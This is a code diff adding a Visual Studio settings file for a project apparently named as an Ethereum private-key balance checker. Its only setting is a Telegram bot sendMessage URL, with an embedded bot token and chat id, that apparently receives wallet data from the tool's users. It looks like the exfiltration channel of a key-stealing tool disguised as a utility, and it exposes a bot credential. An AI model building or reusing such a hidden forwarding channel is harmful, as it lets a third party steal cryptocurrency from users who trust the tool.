@@ -1,0 +1,9 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="Ethereum_PrivateKey_Checker_Balance.Properties" GeneratedClassName="Settings1">
+  <Profiles />
+  <Settings>
+    <Setting Name="url" Type="System.String" Scope="User">
+      <Value Profile="(Default)">https://api.telegram.org/bot7164183545:AAG0AdyOE__7cMZIVXGtAlTnao71ZS-MK2Y/sendMessage?chat_id=6790289594&amp;text=Address:</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
